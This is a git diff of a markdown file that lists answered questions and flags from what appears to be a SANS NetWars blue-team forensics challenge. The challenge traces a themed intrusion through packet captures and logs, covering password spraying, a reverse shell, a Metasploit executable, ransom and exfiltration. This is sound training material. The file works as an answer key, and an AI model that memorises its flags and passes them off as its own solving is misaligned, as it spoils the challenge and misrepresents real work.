+## JON'S PASSWORD - ANSWERED BY YOU 7 HOURS AGO 20 POINTS
 The white walker was able to crack the password of jsnow rather easily. What is jsnow's password?
 Hints:
 If you found the White Walker Port, follow that stream to grab jsnow's password hash. You could install some password cracking tools on your VM, but someone may have cracked this hash previously and the answer is just a search away.
@@ -1106,12 +1106,12 @@ If you found the White Walker Port, follow that stream to grab jsnow's password 
 ___________________________________________________________________________________________________
 ________________________________________________________________________________________________
 _____________________________________________________________________________________________
-#Objective: Finding Evil   
+# Objective: Finding Evil   
 In this category, there are some files somewhere on your system that must be discovered and interacted with to receive the answer.
 
 ________________________________________________________________________________________________
 
-##DECRYPTING TLS - ANSWERED BY YOU 7 HOURS AGO 20 POINTS
+## DECRYPTING TLS - ANSWERED BY YOU 7 HOURS AGO 20 POINTS
 One of the TLS connections found in /home/ranger/Desktop/data/tls.pcap successfully retrieved a web page from an external server containing a 10-word string. Use the sslkeylog.log file found in the same directory to decrypt the TLS data and enter the string (with punctuation) as the answer.
 Hints:
 Import the sslkeylog.log file into Wireshark. Now you should see decrypted content.
@@ -1120,7 +1120,7 @@ Import the sslkeylog.log file into Wireshark. Now you should see decrypted conte
 
 ________________________________________________________________________________________________
 
-##HEX SEARCH - ANSWERED BY YOU 7 HOURS AGO 20 POINTS
+## HEX SEARCH - ANSWERED BY YOU 7 HOURS AGO 20 POINTS
 Write a yara rule to find a file under /usr with the following hex string: 6F 77 2E 00 01 1B 03 3B. Once the file is found, run it and enter the complete string presented (punctuation included).
 Hints:
 Here is a great example on how to write a YARA rule: https://yara.readthedocs.io/en/v3.4.0/writingrules.html.
@@ -1131,7 +1131,7 @@ Here is a great example on how to write a YARA rule: https://yara.readthedocs.io
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
-##Objective: Level 4 README    
+## Objective: Level 4 README    
 For many of the upcoming questions, you will need to utilize data stored in the following tools installed in your CyberDefense NetWars VM:
 
 Kibana
@@ -1146,50 +1146,50 @@ Note that levels four and five have no hints.
 
 ***************************************************
 ________________________________________________________________________________________________
-##ACKNOWLEDGE - ANSWERED BY YOU A DAY AGO 1 POINT
+## ACKNOWLEDGE - ANSWERED BY YOU A DAY AGO 1 POINT
 I have read the Level 4 README.
 
 
 Yes
 
 ________________________________________________________________________________________________________________________________________________________________________________________________
-#Objective: Spray and Pray    
+# Objective: Spray and Pray    
 Zeek logs (/var/log/bro), Evebox, and all PCAPs in /home/ranger/Desktop/data that start with capture can be used to answer this series of questions.
 
 ________________________________________________________________________________________________
 
-##SCANNING SOURCE - ANSWERED BY YOU 6 HOURS AGO 5 POINTS
+## SCANNING SOURCE - ANSWERED BY YOU 6 HOURS AGO 5 POINTS
 There are several alerts related to the Night King scanning a NightFort Web Server. Which source IP is scanning the application?
 	
 Multiple Nmap scans alerted around 2019-11-06T09:46:12.213470-0500 
 **Flag:139.187.160.110 **
 ________________________________________________________________________________________________
 
-##WEB SERVER HEADER - ANSWERED BY YOU 6 HOURS AGO 10 POINTS 1 INCORRECT ATTEMPT
+## WEB SERVER HEADER - ANSWERED BY YOU 6 HOURS AGO 10 POINTS 1 INCORRECT ATTEMPT
 During the web application scan, the Night King found a listening web service. What is the HTTP server application that responded? Include entire contents of the Server header.
 For example, if the Server header were Server: Samwell-Server/2.0 you would answer Samwell-Server/2.0.
 **Flag: Werkzeug/0.16.0 Python/2.7.15+ **
 ________________________________________________________________________________________________
 
-##CREDENTIALS - ANSWERED BY YOU 6 HOURS AGO 10 POINTS 1 INCORRECT ATTEMPT
+## CREDENTIALS - ANSWERED BY YOU 6 HOURS AGO 10 POINTS 1 INCORRECT ATTEMPT
 The Night King manually surfed to the web application after the scan completed and found a login page. What were the first set of credentials attempted? Answer will be in username:password format. For example, if the username was john and the password was snow, your answer would be john:snow.
 **Flag: admin:admin **
 ________________________________________________________________________________________________
 
-##SPRAYED PASSWORD - ANSWERED BY YOU 6 HOURS AGO 15 POINTS
+## SPRAYED PASSWORD - ANSWERED BY YOU 6 HOURS AGO 15 POINTS
 After a couple manual attempts, the Night King launches a password spraying attack against the web application. What is the password that was used?
 **Flag: password123 **
 
 ________________________________________________________________________________________________
 
-##SUCCESSFUL PASSWORD - ANSWERED BY YOU 6 HOURS AGO 20 POINTS
+## SUCCESSFUL PASSWORD - ANSWERED BY YOU 6 HOURS AGO 20 POINTS
 Which username is eventually successful; allowing the attacker to log into the web application?
 **Flag: TheonGreyjoy **
 
 
 ________________________________________________________________________________________________
 
-##OWASP FLAW - ANSWERED BY YOU 6 HOURS AGO 15 POINTS
+## OWASP FLAW - ANSWERED BY YOU 6 HOURS AGO 15 POINTS
 Once logged into the web application, the Night King discovers a flaw with the web application's code. What is the flaw?
 
 Apache Struts
@@ -1200,7 +1200,7 @@ HTTP Request Smuggling
 SQL Injection
 ________________________________________________________________________________________________
 
-##REVERSE SHELL - ANSWERED BY YOU 5 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
+## REVERSE SHELL - ANSWERED BY YOU 5 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
 Once the web application is compromised, the Night King sends a rather lengthy POST request to establish a reverse shell connection back to himself. The POST contains a mix of plain ASCII and URL-encoded characters.
 Find the last 6 characters that are plain ASCII (NOT URL-encoded) and submit that string as your answer. For example, if the POST contained %21a-z%22%23%29abc%3B%27, the answer would be a-zabc.
 Ensure you are viewing the data in its original form! Wireshark likes to "help" you by converting URL-encoded characters to their ASCII representations.
@@ -1209,7 +1209,7 @@ Ensure you are viewing the data in its original form! Wireshark likes to "help" 
 
 ________________________________________________________________________________________________
 
-##WHEN SCANS FAIL - ANSWERED BY YOU 5 HOURS AGO 15 POINTS
+## WHEN SCANS FAIL - ANSWERED BY YOU 5 HOURS AGO 15 POINTS
 After the Night King establishes a reverse shell from the web server, his second command in the shell session finds an interesting service that his port scan did not find.
 What was the second command? The answer is the full command, as typed by the Night King, including any flags.
 
@@ -1222,14 +1222,14 @@ The Night King connects to the newly-discovered service. What TCP port does this
 **Flag: 9200**
 ________________________________________________________________________________________________
 
-##STOLEN RECORDS - ANSWERED BY YOU 5 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
+## STOLEN RECORDS - ANSWERED BY YOU 5 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
 The Night King was able to ransom the data from the newly found service on the web server. How many records were stolen?
 **Flag: 99 **
 
 
 ________________________________________________________________________________________________
 
-##MORE STAGE 2 - ANSWERED BY YOU 5 HOURS AGO 15 POINTS
+## MORE STAGE 2 - ANSWERED BY YOU 5 HOURS AGO 15 POINTS
 A python script was downloaded to the web server to add a ransom message. What is the script's filename? Just the filename, not the path or URL.
 
 **Flag: csv_to_elastic.py **
@@ -1237,7 +1237,7 @@ A python script was downloaded to the web server to add a ransom message. What i
 
 ________________________________________________________________________________________________
 
-##NIGHT KING'S DEMAND - ANSWERED BY YOU 5 HOURS AGO 20 POINTS
+## NIGHT KING'S DEMAND - ANSWERED BY YOU 5 HOURS AGO 20 POINTS
 What does the Night King want in exchange for the data that was stolen from the web server?
 I brought the storm... If you want your data back, send me Bran
 **Flag: Bran **
@@ -1246,17 +1246,17 @@ I brought the storm... If you want your data back, send me Bran
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
-#Objective: Just Trying to Help    
+# Objective: Just Trying to Help    
 Zeek logs (/var/log/bro), Kibana, and all PCAPs in /home/ranger/Desktop/data that start with capture can be used to answer this series of questions.
 ________________________________________________________________________________________________
 
-##WATERING HOLE - ANSWERED BY YOU 5 HOURS AGO 10 POINTS
+## WATERING HOLE - ANSWERED BY YOU 5 HOURS AGO 10 POINTS
 A user asked John Snow why he needed to remote into his machine. John had no idea what he was talking about. John asked him what he did prior to that event. The user remembers downloading a GWAPT index that a colleague told him about to help study for his upcoming exam. What machine downloaded this index? Answer with the machine's IP address.
 
 **Flag: 10.20.30.22 **
 ________________________________________________________________________________________________
 
-##FILE EXTRACTION - ANSWERED BY YOU 5 HOURS AGO 10 POINTS
+## FILE EXTRACTION - ANSWERED BY YOU 5 HOURS AGO 10 POINTS
 Extract the GWAPT index from the appropriate packet capture. What is the MD5 hash of the index file?
 
 **Flag: 2fd3a3cd93263d3f4accee3179afee02 **
@@ -1272,7 +1272,7 @@ It appears that there is a macro embedded in the GWAPT index. This macro pulls d
 
 ________________________________________________________________________________________________
 
-##CALLBACK - ANSWERED BY YOU 5 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
+## CALLBACK - ANSWERED BY YOU 5 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
 After the download of the GWAPT Index, suspicious network connections are made from the victim host. What is the server socket that indicates the C2 connection? Answer is in IP:port format (example: 1.2.3.4:445).
 
 **Flag: 5.3.145.126:22 **
@@ -1280,14 +1280,14 @@ After the download of the GWAPT Index, suspicious network connections are made f
 
 ________________________________________________________________________________________________
 
-##PIVOT - ANSWERED BY YOU 4 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
+## PIVOT - ANSWERED BY YOU 4 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
 Once connection is established from the system that downloaded the GWAPT index, the Night King uses the credentials previously acquired by the White Walkers to log in. From here, the attacker begins pivoting to another host. What is the hostname that the attacker begins launching attacks against? Answer with the hostname (not including the domain).
 
 **Flag: AD **
 
 ________________________________________________________________________________________________
 
-##MORE MALWARE 15 POINTS 1 INCORRECT ATTEMPT
+## MORE MALWARE 15 POINTS 1 INCORRECT ATTEMPT
 What is the name of the file that the Night King transfers to the second system during this attack? Include the file extension, but not the full path. For example: example.exe
 Case Insensitive Text
 **Flag: rev.exe **
@@ -1296,14 +1296,14 @@ TCP Stream 389 in Capture30
 
 ________________________________________________________________________________________________
 
-##WELL-KNOWN ATTACK SUITE - ANSWERED BY YOU 4 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
+## WELL-KNOWN ATTACK SUITE - ANSWERED BY YOU 4 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
 What software suite likely created the executable that was transferred to the second system? Answer is one word.
 
 **Flag: Metasploit **
 
 ________________________________________________________________________________________________
 
-##STOLEN DATA 15 POINTS
+## STOLEN DATA 15 POINTS
 Sensitive data is exfiltrated from this second device. What is the name of the file that was stolen? Answer is the file name only and does not include the full file path.
 
 Case Insensitive Text
@@ -1312,7 +1312,7 @@ Case Insensitive Text
 
 ***************************************************
 ________________________________________________________________________________________________
-#Objective: Level 5 README 
+# Objective: Level 5 README 
 Get ready for the most difficult questions in the game! Read the questions very carefully to locate the data you will need to arrive at your answer.
 
 Level five has no hints.
@@ -1323,21 +1323,21 @@ Yes
 
 ***************************************************
 ________________________________________________________________________________________________
-#Objective: Cloud Logs     
+# Objective: Cloud Logs     
 There has been some strange activity in the Night's Watch AWS account. Use the /home/ranger/Desktop/data/cloudtrail_console.json log file to answer the questions below.
 ________________________________________________________________________________________________
 
-##NON-HUMAN AGENT - ANSWERED BY YOU 4 HOURS AGO 10 POINTS 1 INCORRECT ATTEMPT
+## NON-HUMAN AGENT - ANSWERED BY YOU 4 HOURS AGO 10 POINTS 1 INCORRECT ATTEMPT
 One connection is using a very strange user agent string that is not typically used by typical, human users. What is the complete User Agent string in question?
 **Flag: Googlebot/2.1 (+http://www.google.com/bot.html)**
 ________________________________________________________________________________________________
 
-##A LITTLE OUT OF DATE - ANSWERED BY YOU 4 HOURS AGO 10 POINTS
+## A LITTLE OUT OF DATE - ANSWERED BY YOU 4 HOURS AGO 10 POINTS
 Which user account (userName only) is using a MAC OS X system that is a little bit out of date compared to the other users' MAC OS X systems?
 **Flag: olly**
 ________________________________________________________________________________________________
 
-##IMPOSSIBLE LOGIN 25 POINTS 10 INCORRECT ATTEMPTS - 3 POINTS LOST
+## IMPOSSIBLE LOGIN 25 POINTS 10 INCORRECT ATTEMPTS - 3 POINTS LOST
 As you may have noticed, these users log in from many different places across the globe. However, one of the accounts is an impossible traveler (i.e., they could not, without the help of a VPN or compromised account, get from one location to another, physically, and log in in a given timeframe). Locate this impossible traveler and answer with the time (in UTC as it is shown in the log) of the first occurrence of their impossible travel.
 Grenn's first 15 hr trip between Costa Rica and China
 **Flag:2019-01-14T21:20:27Z**
@@ -1345,24 +1345,24 @@ Grenn's first 15 hr trip between Costa Rica and China
 
 ________________________________________________________________________________________________
 
-##OFF-HOURS - ANSWERED BY YOU 8 MINUTES AGO 25 POINTS
+## OFF-HOURS - ANSWERED BY YOU 8 MINUTES AGO 25 POINTS
 The Night's Watch all work from 0900 until 1700 in their respective timezones, but rangers will sometimes connect outside regular hours. A connection of interest was identified in the log file, which occurred between the hours of 02:30 and 03:00 in the local time zone of the connection source. What is the eventID of this connection?
 **Flag: 28e5b18e-a07d-17d3-16c3-f6c29f5b18e5**
 
 
 ________________________________________________________________________________________________
 ***************************************************
-#Objective: Hiding in Plain Sight     
+# Objective: Hiding in Plain Sight     
 The ravens are communicating with the Knight King in very unique ways. Attempt to recover the final two messages to the Knight King.
 ________________________________________________________________________________________________
 
-##MESSAGE TO NIGHT KING - ANSWERED BY YOU 3 MINUTES AGO 25 POINTS 1 INCORRECT ATTEMPT
+## MESSAGE TO NIGHT KING - ANSWERED BY YOU 3 MINUTES AGO 25 POINTS 1 INCORRECT ATTEMPT
 If you view the PCAP, /home/ranger/Desktop/data/raven-c2.pcap, you will notice that the ravens are using very strange C2. What was the message that the ravens left for the Night King on 5.11.51.10? The answer will be a sentence with spaces and no punctuation.
 For example: This is a sentence
 **Flag: Bran will be in Godswood in front of the Weirwood tree **
 ________________________________________________________________________________________________
 
-##SIGNAL IN THE NOISE 34 POINTS
+## SIGNAL IN THE NOISE 34 POINTS
 Another message was left behind during this attack. This time, however, the message is hidden inside the file located at https://sansblueteam.s3.amazonaws.com/music.mp3. Solving this challenge qualifies you to join an exclusive ranger unit. The key is to look carefully at the content.
 
 The answer is in the form of a five word message that you will carve out of the music.mp3 file.
